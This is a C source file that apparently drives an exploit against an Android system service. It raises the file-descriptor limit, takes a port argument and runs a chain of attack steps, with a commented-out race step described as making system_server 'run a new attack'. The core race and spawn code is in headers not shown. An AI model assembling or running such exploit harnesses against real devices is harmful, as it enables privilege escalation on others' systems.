#include <stdlib.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <stdio.h>
#include "pointer.h"
#include "race.h"
#include "spawn.h"

typedef PhyPointer (*ExecuteStep)(PhyPointer);

PhyPointer stepOne(PhyPointer p) {
    printf("Executing stepOne\n");
    p.v=(void*)1;
    return p;
}

PhyPointer stepTwo(PhyPointer p) {
    printf("Executing stepTwo\n");
    printf("result %p %p\n", p.v, p.p);
    return p;
}

PhyPointer stepThree(PhyPointer p) {
    munmap(p.v,getpagesize());
    return p;
}

int port_to_use = 0;

static int
maximize_fd_limit(void)
{
    struct rlimit rlim;
    int ret;

    ret = getrlimit(RLIMIT_NOFILE, &rlim);
    if (ret != 0) {
        return -1;
    }
    printf("\nmaximize fd from %d to %d\n\n",rlim.rlim_cur, rlim.rlim_max);
    rlim.rlim_cur = rlim.rlim_max;
    setrlimit(RLIMIT_NOFILE, &rlim);

    ret = getrlimit(RLIMIT_NOFILE, &rlim);
    if (ret != 0) {
        return -1;
    }

    return rlim.rlim_cur;
}

ExecuteStep stateMachine[] = {
  spawn };

//    race2 will tell the system_server to run a new attack
//    race2, 
//    stepThree };

int main(int argc, char** argv) {
    int i = 0;
    int rca = maximize_fd_limit();
    if (argc <= 1) { return 1; }
    port_to_use = atoi(argv[1]);
    printf("ret: %d\n",rca);
    PhyPointer result;
    result.p = 0;
    result.v = 0;
    for (i = 0; i < sizeof(stateMachine)/sizeof(ExecuteStep); ++i) {
        result = stateMachine[i](result);
        if (!result.v) {
            break;
        }
    }
    printf("result %p %p\n", result.v, result.p);
    printf("result %x %x\n", result.v, result.p);
    return 0;
}

